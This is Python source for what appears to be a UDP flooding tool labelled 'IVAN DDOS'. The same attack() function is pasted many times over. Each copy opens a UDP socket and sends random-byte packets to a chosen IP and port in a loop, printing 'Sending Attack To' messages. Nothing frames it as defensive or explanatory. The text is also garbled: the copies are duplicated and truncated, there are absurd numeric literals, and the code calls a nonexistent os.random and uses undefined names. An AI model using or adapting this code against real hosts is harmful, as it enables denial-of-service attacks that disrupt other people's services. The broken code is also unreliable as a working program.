    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
